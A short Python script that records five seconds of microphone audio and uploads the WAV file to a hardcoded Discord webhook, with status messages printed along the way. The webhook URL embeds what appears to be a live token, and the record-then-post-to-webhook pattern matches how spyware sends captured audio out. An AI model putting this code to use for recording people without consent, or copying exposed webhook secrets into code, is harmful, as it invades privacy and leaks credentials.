import pyaudio
import wave
import requests
import os

def record_and_send_audio_to_discord(webhook_url, record_seconds=5, output_filename="output.wav"):
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100
    CHUNK = 1024
    audio = pyaudio.PyAudio()

    # Start recording
    stream = audio.open(format=FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        input=True,
                        frames_per_buffer=CHUNK)

    print("Recording...")

    frames = []

    # Record audio in chunks
    for _ in range(0, int(RATE / CHUNK * record_seconds)):
        data = stream.read(CHUNK)
        frames.append(data)

    print("Recording finished.")

    # Stop recording
    stream.stop_stream()
    stream.close()
    audio.terminate()

    # Save recorded audio to a file
    with wave.open(output_filename, 'wb') as wf:
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(audio.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))

    print("Audio saved to", output_filename)

    # Prepare data to send to Discord
    data = {'content': 'Here is the recorded audio:'}
    files = {'file': open(output_filename, 'rb')}

    # Send data to Discord webhook
    try:
        response = requests.post(webhook_url, data=data, files=files)
        response.raise_for_status()
        print("Audio successfully sent to Discord.")
    except requests.exceptions.RequestException as err:
        print(f"Error sending audio to Discord: {err}")


DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1207259632066895873/zD61HmC_iqHNHCw9FAtfhrVLtxgn-GyFzrNQNTwAYIlglucL6XaTiChQZOteEom9lduO"


record_and_send_audio_to_discord(DISCORD_WEBHOOK_URL)
